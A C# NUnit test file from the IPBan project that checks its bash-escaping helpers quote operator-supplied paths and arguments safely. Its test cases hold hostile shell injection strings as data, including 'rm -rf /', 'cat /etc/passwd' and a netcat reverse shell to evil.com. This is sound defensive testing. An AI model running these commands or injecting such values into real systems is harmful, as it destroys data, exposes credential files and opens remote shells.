/*
MIT License

Copyright (c) 2012-present Digital Ruby, LLC - https://ipban.com

Tests for ProcessUtility.BashEscape — covers the shell-escaping primitive used by
CreateDetachedProcess to keep operator-supplied path/argument strings inert when
they end up inside a bash script.
*/

using DigitalRuby.IPBanCore;

using NUnit.Framework;
using NUnit.Framework.Legacy;

namespace DigitalRuby.IPBanTests
{
    /// <summary>
    /// ProcessUtility.BashEscape — the security-critical primitive for safely embedding
    /// strings inside the temp shell script that CreateDetachedProcess writes. Full end-to-end
    /// CreateDetachedProcess coverage requires `at` / `schtasks`, so it is left to manual
    /// runs on a real host; this fixture covers the escape function in isolation.
    /// </summary>
    [TestFixture]
    public sealed class IPBanProcessUtilityTests
    {
        [Test]
        public void NullBecomesEmptyQuotedString()
        {
            ClassicAssert.AreEqual("''", ProcessUtility.BashEscape(null));
        }

        [Test]
        public void EmptyStringBecomesEmptyQuotedString()
        {
            ClassicAssert.AreEqual("''", ProcessUtility.BashEscape(""));
        }

        [Test]
        public void SimpleStringIsSingleQuoted()
        {
            ClassicAssert.AreEqual("'/usr/bin/example'", ProcessUtility.BashEscape("/usr/bin/example"));
        }

        [Test]
        public void EmbeddedSingleQuoteIsEscapedWithCanonicalIdiom()
        {
            // canonical bash idiom: ' becomes '\''  (close-quote, escaped quote, reopen-quote)
            ClassicAssert.AreEqual(@"'it'\''s'", ProcessUtility.BashEscape("it's"));
        }

        [TestCase(";rm -rf /;", "';rm -rf /;'")]
        [TestCase("$(whoami)", "'$(whoami)'")]
        [TestCase("`id`", "'`id`'")]
        [TestCase("&& cat /etc/passwd", "'&& cat /etc/passwd'")]
        [TestCase("path with spaces", "'path with spaces'")]
        [TestCase("|| nc evil.com 4444 -e /bin/sh", "'|| nc evil.com 4444 -e /bin/sh'")]
        [TestCase(">/dev/null;curl evil", "'>/dev/null;curl evil'")]
        public void HostileShellMetacharactersAreInert(string input, string expected)
        {
            // each of these would do something nasty if concatenated into a bash -c string.
            // single-quoted, they are inert literals — bash treats every byte until the next
            // unescaped single quote as raw text.
            ClassicAssert.AreEqual(expected, ProcessUtility.BashEscape(input));
        }

        [Test]
        public void MultipleSingleQuotesAreAllEscaped()
        {
            // every single quote in the input must get its own '\'' replacement
            ClassicAssert.AreEqual(@"'a'\''b'\''c'", ProcessUtility.BashEscape("a'b'c"));
        }

        // -------------------- BuildAtJobBody --------------------
        // The string body that gets piped into `at` on Linux. This is the security boundary —
        // it's where path/argument escaping has to be exactly right because /bin/sh later
        // parses this content via the at spool. Cross-platform unit tests; no `at` needed.

        [Test]
        public void BuildAtJobBody_SimplePath()
        {
            string body = ProcessUtility.BuildAtJobBody("/bin/true", string.Empty);
            ClassicAssert.AreEqual("sudo '/bin/true'\n", body);
        }

        [Test]
        public void BuildAtJobBody_PathWithSpaceIsSingleQuoted()
        {
            // A path with a space must end up as a single token after /bin/sh parses it.
            // Single-quoting is the only way to survive shell tokenization unchanged.
            string body = ProcessUtility.BuildAtJobBody("/tmp/has a space.sh", string.Empty);
            ClassicAssert.AreEqual("sudo '/tmp/has a space.sh'\n", body);
        }

        [TestCase("/tmp/x;rm -rf /;y", "sudo '/tmp/x;rm -rf /;y'\n")]
        [TestCase("/tmp/$(whoami)/bin", "sudo '/tmp/$(whoami)/bin'\n")]
        [TestCase("/tmp/`id`", "sudo '/tmp/`id`'\n")]
        [TestCase("/tmp/&& cat /etc/passwd", "sudo '/tmp/&& cat /etc/passwd'\n")]
        public void BuildAtJobBody_HostilePathsAreInert(string fileName, string expected)
        {
            // Each of these would execute arbitrary shell if concatenated unquoted into a
            // bash command. Wrapped in single quotes by BashEscape, they're literal text.
            ClassicAssert.AreEqual(expected, ProcessUtility.BuildAtJobBody(fileName, string.Empty));
        }

        [Test]
        public void BuildAtJobBody_EmbeddedSingleQuoteIsEscaped()
        {
            // A path containing a literal single quote needs the '\'' canonical bash escape
            // so the surrounding quotes stay balanced.
            string body = ProcessUtility.BuildAtJobBody("/tmp/it's-fine", string.Empty);
            ClassicAssert.AreEqual(@"sudo '/tmp/it'\''s-fine'" + "\n", body);
        }

        [Test]
        public void BuildAtJobBody_ArgumentsAppendedAfterFileName()
        {
            // arguments is operator-supplied (already a shell-formed argument string by
            // contract). It appears after the quoted fileName as-is.
            string body = ProcessUtility.BuildAtJobBody("/usr/bin/myprog", "--flag value");
            ClassicAssert.AreEqual("sudo '/usr/bin/myprog' --flag value\n", body);
        }

        [Test]
        public void BuildAtJobBody_NullOrEmptyArgumentsOmitsArgs()
        {
            ClassicAssert.AreEqual("sudo '/bin/true'\n",
                ProcessUtility.BuildAtJobBody("/bin/true", null));
            ClassicAssert.AreEqual("sudo '/bin/true'\n",
                ProcessUtility.BuildAtJobBody("/bin/true", string.Empty));
        }

        [Test]
        public void BuildAtJobBody_TerminatesWithNewline()
        {
            // The body is piped into `at` via stdin; at expects a trailing newline so it
            // treats the body as a complete command. Without one, at may silently truncate.
            string body = ProcessUtility.BuildAtJobBody("/bin/true", "arg");
            ClassicAssert.IsTrue(body.EndsWith('\n'),
                "body must end with a newline for at to accept it as a complete command");
        }
    }
}
